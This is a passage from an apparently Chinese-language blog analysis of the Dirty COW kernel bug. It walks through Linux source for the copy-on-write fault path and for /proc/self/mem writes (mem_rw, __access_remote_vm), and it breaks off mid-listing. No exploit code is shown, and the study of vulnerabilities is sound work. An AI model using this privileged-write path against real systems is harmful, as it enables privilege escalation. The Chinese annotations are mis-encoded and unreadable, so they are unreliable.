class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//ÂéüÊúâÁöÑÈ°µ</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">old_page</span>;</span><br><br>	old_page = vm_normal_page(vma, fe-&gt;address, orig_pte);<span class="hljs-comment">//Ëé∑ÂèñÁº∫È°µÁöÑÁ∫øÊÄßÂú∞ÂùÄÂØπÂ∫îÁöÑstruct pageÁªìÊûÑÔºåÂØπ‰∫é‰∏Ä‰∫õÁâπÊÆäÊò†Â∞ÑÁöÑÈ°µÈù¢ÔºàÂ¶ÇÈ°µÈù¢ÂõûÊî∂„ÄÅÈ°µËøÅÁßªÂíåKSMÁ≠âÔºâÔºåÂÜÖÊ†∏Âπ∂‰∏çÂ∏åÊúõËøô‰∫õÈ°µÂèÇ‰∏éÂà∞ÂÜÖÂ≠òÁÆ°ÁêÜÁöÑ‰∏Ä‰∫õÊµÅÁ®ãÂΩì‰∏≠ÔºåÁß∞‰πã‰∏∫ special mappingÔºåÂπ∂Êó†ÂØπÂ∫îÁöÑstruct pageÁªìÊûÑ‰Ωì</span><br>	<span class="hljs-keyword">if</span> (!old_page) &#123;<span class="hljs-comment">//NULLÔºåËØ¥ÊòéÊòØ‰∏Ä‰∏™ special mapping È°µÈù¢ÔºõÂê¶ÂàôËØ¥ÊòéÊòØnormal mappingÈ°µÈù¢</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span><br><span class="hljs-comment">		 * VM_PFNMAP VMA.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * We should not cow pages in a shared writeable mapping.</span><br><span class="hljs-comment">		 * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>				     (VM_WRITE|VM_SHARED))<br>			<span class="hljs-keyword">return</span> wp_pfn_shared(fe, orig_pte);<br><br>		pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>		<span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Take out anonymous pages first, anonymous shared vmas are</span><br><span class="hljs-comment">	 * not dirty accountable.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//ÂÖàÂ§ÑÁêÜÂåøÂêçÈ°µÈù¢</span><br>	<span class="hljs-keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;<span class="hljs-comment">//ÂéüÈ°µÈù¢‰∏∫ÂåøÂêçÈ°µÈù¢ &amp;&amp; ‰∏çÊòØksmÈ°µÈù¢</span><br>		<span class="hljs-type">int</span> total_mapcount;<br>		<span class="hljs-keyword">if</span> (!trylock_page(old_page)) &#123;<span class="hljs-comment">//Â§öÁ∫øÁ®ãÁõ∏ÂÖ≥Êìç‰ΩúÔºåÂà§Êñ≠ÊòØÂê¶ÊúâÂÖ∂‰ªñÁ∫øÁ®ãÁöÑÁ´û‰∫â</span><br>			get_page(old_page);<br>			pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>			lock_page(old_page);<br>			fe-&gt;pte = pte_offset_map_lock(vma-&gt;vm_mm, fe-&gt;pmd,<br>					fe-&gt;address, &amp;fe-&gt;ptl);<br>			<span class="hljs-keyword">if</span> (!pte_same(*fe-&gt;pte, orig_pte)) &#123;<br>				unlock_page(old_page);<br>				pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>				put_page(old_page);<br>				<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>			&#125;<br>			put_page(old_page);<br>		&#125;<br>        <span class="hljs-comment">//Ê≠§Êó∂Ê≤°ÊúâÂÖ∂‰ªñÁ∫øÁ®ã‰∏éÊú¨Á∫øÁ®ãÁ´û‰∫â‰∫ÜÔºåË∞ÉÁî® reuse_swap_page() Âà§Êñ≠‰ΩøÁî®ËØ•È°µÁöÑÊòØÂê¶Âè™Êúâ‰∏Ä‰∏™ËøõÁ®ãÔºåËã•ÊòØÁöÑËØùÂ∞±Áõ¥Êé•ÈáçÁî®ËØ•È°µ</span><br>		<span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123;<br>			<span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br>				<span class="hljs-comment">/*</span><br><span class="hljs-comment">				 * The page is all ours. Move it to</span><br><span class="hljs-comment">				 * our anon_vma so the rmap code will</span><br><span class="hljs-comment">				 * not search our parent or siblings.</span><br><span class="hljs-comment">				 * Protected against the rmap code by</span><br><span class="hljs-comment">				 * the page lock.</span><br><span class="hljs-comment">				 */</span><br>				page_move_anon_rmap(old_page, vma);<br>			&#125;<br>			unlock_page(old_page);<br>			<span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>		&#125;<br>		unlock_page(old_page);<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>					(VM_WRITE|VM_SHARED))) &#123;<br>		<span class="hljs-keyword">return</span> wp_page_shared(fe, orig_pte, old_page);<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Ok, we need to copy. Oh, well..</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//ÂÆûÂú®Ê≤°Ê≥ïÈáçÁî®‰∫ÜÔºåËøõË°åÂÜôÊó∂Â§çÂà∂</span><br>	get_page(old_page);<br><br>	pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>	<span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="COWÂíåÁº∫È°µÂºÇÂ∏∏Áõ∏ÂÖ≥ÊµÅÁ®ã"><a href="#COWÂíåÁº∫È°µÂºÇÂ∏∏Áõ∏ÂÖ≥ÊµÅÁ®ã" class="headerlink" title="COWÂíåÁº∫È°µÂºÇÂ∏∏Áõ∏ÂÖ≥ÊµÅÁ®ã"></a>COWÂíåÁº∫È°µÂºÇÂ∏∏Áõ∏ÂÖ≥ÊµÅÁ®ã</h2><h3 id="write„ÅÆÊâßË°åÊµÅ"><a href="#write„ÅÆÊâßË°åÊµÅ" class="headerlink" title="write„ÅÆÊâßË°åÊµÅ"></a>write„ÅÆÊâßË°åÊµÅ</h3><p>È¶ñÂÖàÂÖàÊù•‰∫ÜËß£‰∏Ä‰∏ãÁ≥ªÁªüË∞ÉÁî®<code>write</code>ÁöÑÊâßË°åÊµÅ</p>
<h4 id="sys-write"><a href="#sys-write" class="headerlink" title="sys_write"></a>sys_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE3(write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, buf,<br>		<span class="hljs-type">size_t</span>, count)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd);<span class="hljs-comment">//Ê†πÊçÆfdÊâæÂà∞ÂØπÂ∫îÁöÑÊñá‰ª∂ÂØπË±°ÂíåÊ†áÂøó</span><br>	<span class="hljs-type">ssize_t</span> ret = -EBADF;<br><br>	<span class="hljs-keyword">if</span> (f.file) &#123;<br>		<span class="hljs-type">loff_t</span> pos = file_pos_read(f.file); 		<span class="hljs-comment">//ËØªÂèñÊñá‰ª∂ÂØπË±°ÁöÑ‰ΩçÁΩÆÊåáÈíà</span><br>		ret = vfs_write(f.file, buf, count, &amp;pos);	<span class="hljs-comment">//ÈÄöËøáËôöÊãüÊñá‰ª∂Á≥ªÁªüÊñá‰ª∂ÁöÑÂÜôÊìç‰Ωú</span><br>		<span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>)<br>			file_pos_write(f.file, pos);		   <span class="hljs-comment">//ËÆæÁΩÆÊñá‰ª∂ÂØπË±°ÁöÑ‰ΩçÁΩÆÊåáÈíà</span><br>		fdput_pos(f);							  <span class="hljs-comment">//ÈáäÊîæËøô‰∏™ÂØπË±°ÁöÑÂºïÁî®</span><br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_write</span>()<br>	<span class="hljs-built_in">vfs_write</span>()<br>		<span class="hljs-built_in">__vfs_write</span>()<br>			file-&gt;f_op-&gt;<span class="hljs-built_in">write</span>()<span class="hljs-comment">//ËØ•Êñá‰ª∂‰∫éÂÜÖÊ†∏‰∏≠ÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶ÁöÑfile_operationsÁªìÊûÑ‰ΩìÔºåÁ±ª‰ºº‰∫é‰∏ÄÂº†ÂáΩÊï∞Ë°®ÔºåÂÇ®Â≠ò‰∫ÜÈªòËÆ§ÁöÑÂØπ‰∫é‰∏Ä‰∫õÁ≥ªÁªüË∞ÉÁî®ÁöÑÂ§ÑÁêÜÂáΩÊï∞ÊåáÈíà</span><br></code></pre></td></tr></table></figure>

<h3 id="proc-self-memÔºöÁªïËøáÈ°µË°®È°πÊùÉÈôê"><a href="#proc-self-memÔºöÁªïËøáÈ°µË°®È°πÊùÉÈôê" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;memÔºöÁªïËøáÈ°µË°®È°πÊùÉÈôê"></a>&#x2F;proc&#x2F;self&#x2F;memÔºöÁªïËøáÈ°µË°®È°πÊùÉÈôê</h3><p>‚ÄúËÑèÁâõ‚ÄùÈÄöÂ∏∏Âà©Áî®ÁöÑÊòØ <code>/proc/self/mem</code> ËøõË°åË∂äÊùÉÂÜôÂÖ•ÔºåËøô‰πüÊòØÊï¥‰∏™‚ÄúËÑèÁâõ‚ÄùÂà©Áî®‰∏≠ËæÉ‰∏∫Ê†∏ÂøÉÁöÑÊµÅÁ®ã</p>
<p>ÂØπ‰∫é<code>/proc/self/mem</code>Ëøô‰∏™Êñá‰ª∂ÂØπË±°Êù•ËØ¥, ‰ºöË∞ÉÁî®<code>mem_write()</code>ÂáΩÊï∞</p>
<h4 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write()"></a>mem_write()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params">			 <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> mem_rw(file, (<span class="hljs-type">char</span> __user*)buf, count, ppos, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>mem_write</code>Ë∞ÉÁî®<code>mem_rw</code></p>
<h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw()"></a>mem_rw()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-comment">//Ë¶ÅËØª/ÂÜôÁöÑÊñá‰ª∂</span></span><br><span class="hljs-params">                      <span class="hljs-type">char</span> __user *buf,	 <span class="hljs-comment">//Áî®Êà∑Á©∫Èó¥ÁºìÂÜ≤Âå∫</span></span><br><span class="hljs-params">					<span class="hljs-type">size_t</span> count, 	   <span class="hljs-comment">//ËØª/ÂÜôÈïøÂ∫¶</span></span><br><span class="hljs-params">                      <span class="hljs-type">loff_t</span> *ppos, 	 <span class="hljs-comment">//ÂºÄÂßãÁöÑÂú∞Êñπ</span></span><br><span class="hljs-params">                      <span class="hljs-type">int</span> write)</span>		 <span class="hljs-comment">//ËØª/ÂÜô</span><br>&#123;<br>    <span class="hljs-comment">//Ê†πÊçÆ/proc/self/memËøô‰∏™Êñá‰ª∂ÂØπË±°ÁöÑÁßÅÊúâÊï∞ÊçÆÂå∫Âüü, ÊâæÂà∞ÂÖ∂Êò†Â∞ÑÁöÑÊòØÂì™‰∏Ä‰∏™ËôöÊãüÂú∞ÂùÄÁ©∫Èó¥, ÁÑ∂ÂêéÂú®ÂÜÖÊ†∏‰∏≠Áî≥ËØ∑‰∫Ü‰∏Ä‰∏™‰∏¥Êó∂È°µ‰Ωú‰∏∫ÂÜÖÊ†∏ÁºìÂÜ≤Âå∫</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;	<span class="hljs-comment">//memÊñá‰ª∂ÁöÑÁßÅÊúâÊï∞ÊçÆÂå∫ÂüüÊåáÂêëÂØπÂ∫îÁöÑËôöÊãüÂÜÖÂ≠òÁ©∫Èó¥</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;			<span class="hljs-comment">//ÂÅèÁßªÔºåmm‰∏≠Ë¶ÅËØªÂÜôÁöÑÂú∞ÂùÄ</span><br>	<span class="hljs-type">ssize_t</span> copied;<br>	<span class="hljs-type">char</span> *page;<br><br>	<span class="hljs-keyword">if</span> (!mm)<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	page = (<span class="hljs-type">char</span> *)__get_free_page(GFP_TEMPORARY);		<span class="hljs-comment">//Ëé∑Âèñ‰∏Ä‰∏™‰∏¥Êó∂È°µÔºåsys_writeÈôêÂà∂ÊúÄÂ§öÂÜô‰∏ÄÈ°µ</span><br>	<span class="hljs-keyword">if</span> (!page)<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br><br>	copied = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))		<span class="hljs-comment">//Â¢ûÂä†‰∏Ä‰∏™ÂºïÁî®</span><br>		<span class="hljs-keyword">goto</span> <span class="hljs-built_in">free</span>;<br>	<span class="hljs-comment">//ÈÄöËøá‰∏Ä‰∏™Âæ™ÁéØÂÜôÂÖ•countÈïøÊï∞ÊçÆ, copy_from_userÊääÊï∞ÊçÆÊê¨ËøêÂà∞ÂÜÖÊ†∏ÁºìÂÜ≤Âå∫‰∏≠, ÂÜçË∞ÉÁî®access_remote_vm()ÂÜôÂÖ•ËôöÊãüÂú∞ÂùÄÁ©∫Èó¥‰∏≠</span><br>	<span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//countË°®Á§∫Ââ©‰ΩôË¶ÅÂÜôÂÖ•ÁöÑÈïøÂ∫¶</span><br>		<span class="hljs-type">int</span> this_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">int</span>, count, PAGE_SIZE);	<span class="hljs-comment">//Êú¨Ê¨°ÂÜôÂÖ•Â§öÂ∞ë</span><br>		<span class="hljs-comment">//Êäädata‰ªéÁî®Êà∑Á©∫Èó¥bufÂ§çÂà∂Âà∞ÂÜÖÊ†∏ÁöÑ‰∏¥Êó∂È°µ</span><br>		<span class="hljs-keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;<br>			copied = -EFAULT;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">//ËØªÂÜôÂà´‰∫∫ÁöÑËôöÊãüÂú∞ÂùÄÁ©∫Èó¥</span><br>		this_len = access_remote_vm(mm, addr, page, this_len, write);<br>		<span class="hljs-keyword">if</span> (!this_len) &#123;<br>			<span class="hljs-keyword">if</span> (!copied)<br>				copied = -EIO;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">//ËØªÂèñÔºåÊääÂÜÖÊ†∏ËØªÂà∞ÁöÑÊï∞ÊçÆÂ§çÂà∂Âà∞Áî®Êà∑buf</span><br>		<span class="hljs-keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;<br>			copied = -EFAULT;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		buf += this_len;	<span class="hljs-comment">//	Áî®Êà∑ÁºìÂÜ≤Âå∫</span><br>		addr += this_len;	<span class="hljs-comment">//ËØªÂÜôÂú∞ÂùÄ</span><br>		copied += this_len;	<span class="hljs-comment">//ËØªÂÜô‰∫ÜÂ§öÂ∞ëÂ≠óËäÇ</span><br>		count -= this_len;	<span class="hljs-comment">//ËøòÂâ©Â§öÂ∞ëÂ≠óËäÇ</span><br>	&#125;<br>	*ppos = addr;<br><br>	mmput(mm);<br><span class="hljs-built_in">free</span>:<br>	free_page((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page);<br>	<span class="hljs-keyword">return</span> copied;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>access_remote_vm()</code>ÊòØÂØπ<code>__access_remote_vm</code>ÁöÑÂåÖË£Ö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">access_remote_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params">		<span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __access_remote_vm(<span class="hljs-literal">NULL</span>, mm, addr, buf, len, write);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="__access_remote_vm()"></a>__access_remote_vm()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span><br><span class="hljs-comment"> * given task for page fault accounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//ËÆøÈóÆmmÊåáÂêëÁöÑÂÖ∂‰ªñËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥ÔºåÂ¶ÇÊûútskÈùûNULLÔºåÂàôÁî®Êù•ËøõË°åÁº∫È°µÂºÇÂ∏∏ËÆ°Êï∞</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br>	<span class="hljs-type">void</span> *old_buf = buf;<br><br>	down_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">//Ëé∑Âèñmmap_sem‰ø°Âè∑Èáè</span><br>	<span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br>	<span class="hljs-keyword">while</span> (len) &#123;<span class="hljs-comment">//Âæ™ÁéØÔºåÁõ¥Âà∞ÂÜôÂÖ•lenÈïøÂ∫¶</span><br>		<span class="hljs-type">int</span> bytes, ret, offset;<br>		<span class="hljs-type">void</span> *maddr;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br>		<span class="hljs-comment">//ÊääË¶ÅËÆøÈóÆÁöÑÂÖ∂‰ªñËøõÁ®ãÁöÑÈ°µÈù¢ÈîÅÂÆöÂú®ÂÜÖÂ≠ò‰∏≠ÔºåÈÅøÂÖçÁº∫È°µÂºÇÂ∏∏ÔºåËøôÈáåÂè™Ëé∑Âèñ1È°µÔºåpageÂ∞±ÊòØÈîÅÂÆöÁöÑÈÇ£‰∏ÄÈ°µ</span><br>		ret = get_user_pages_remote(tsk, mm, addr, <span class="hljs-number">1</span>,<br>				write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br>		<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br>			<span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment">			 * we can access using slightly different code.</span><br><span class="hljs-comment">			 */</span><br>			vma = find_vma(mm, addr);<br>			<span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br>				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br>							  len, write);<br>			<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br>				<span class="hljs-keyword">break</span>;<br>			bytes = ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			bytes = len;		<span class="hljs-comment">//Ë¶ÅÂÜôÂÖ•ÁöÑÈïøÂ∫¶</span><br>			offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);	<span class="hljs-comment">//addrÁöÑÈ°µÂÜÖÂÅèÁßª</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            	bytes+offset &lt;= PAGE_SIZE</span><br><span class="hljs-comment">            	=&gt;ÂÜôÂÖ•ÈïøÂ∫¶+È°µÂÜÖÂÅèÁßª&lt;=PAGE_SIZE</span><br><span class="hljs-comment">            	=&gt;ÈîÅÂÆöÊòØÈ°µ‰∏∫Âçï‰ΩçÁöÑÔºåÂõ†Ê≠§‰∏çËÉΩË∑®È°µÂÜôÂÖ•</span><br><span class="hljs-comment">            */</span><br>			<span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br>				bytes = PAGE_SIZE-offset;<br>			<span class="hljs-comment">//Ê≠§Êó∂ÁöÑpage‰∏∫get_user_pages_remote()‰∏∫Áî®Êà∑ÂØªÊâæÁöÑÔºåÊòØË¢´ÈîÅÂÆöÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÈ°µÔºåkmapÂ∞ÜÂÖ∂Êò†Â∞ÑÂú®ÂÜÖÊ†∏Âú∞ÂùÄÁ©∫Èó¥‰∏≠</span><br>			maddr = kmap(page);<br>			<span class="hljs-keyword">if</span> (write) &#123;	<span class="hljs-comment">//ÂÜôÂÖ•ËØ∑Ê±Ç</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                	ÂÖàË∞ÉÁî®copy_to_user_page()ËøõË°åÂÜôÂÖ•</span><br><span class="hljs-comment">                	maddr‰∏∫Ê†πÊçÆaddrÈîÅÂÆöÁöÑÈ°µÔºåoffset‰∏∫addrÈ¢ùÈ°µÂÜÖÂÅèÁßªÔºå‰∏§ËÄÖÁõ∏Âä†Â∞±ÊòØË¶ÅÂÜôÂÖ•ÁöÑÂú∞ÂùÄ</span><br><span class="hljs-comment">                	Á≠â‰ª∑‰∏∫Ôºömemcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>				copy_to_user_page(vma, page, addr,<br>						  maddr + offset, buf, bytes);<br>                <span class="hljs-comment">//Ê†áËÆ∞‰∏∫ËÑèÈ°µ</span><br>				set_page_dirty_lock(page);<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//Á≠â‰ª∑Ôºömemcpy(buf, maddr+offset, bytes)</span><br>				copy_from_user_page(vma, page, addr,<br>						    buf, maddr + offset, bytes);<br>			&#125;<br>			kunmap(page);<br>			put_page(page);<span class="hljs-comment">//ÈáäÊîæ</span><br>		&#125;<br>		len -= bytes;<br>		buf += bytes;<br>		addr += bytes;<br>	&#125;<br>	up_read(&amp;mm-&gt;mmap_sem);<br><br>	<span class="hljs-keyword">return</span> buf - old_buf;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>Ëøô‰∏™ÂáΩÊï∞ÁöÑÊ†∏ÂøÉÂ∞±Âú®‰∏éÊÄé‰πàÊääÂà´ÁöÑËøõÁ®ãÁöÑÈ°µÈù¢ÈîÅÂÆöÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑ, Âõ†Ê≠§<code>get_user_pages_remote()</code>ÊòØ<code>__access_remote_vm()</code>ÁöÑÊ†∏ÂøÉÂáΩÊï∞</p>
<h4 id="get-user-pages-remote"><a href="#get-user-pages-remote" class="headerlink" title="get_user_pages_remote()"></a>get_user_pages_remote()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 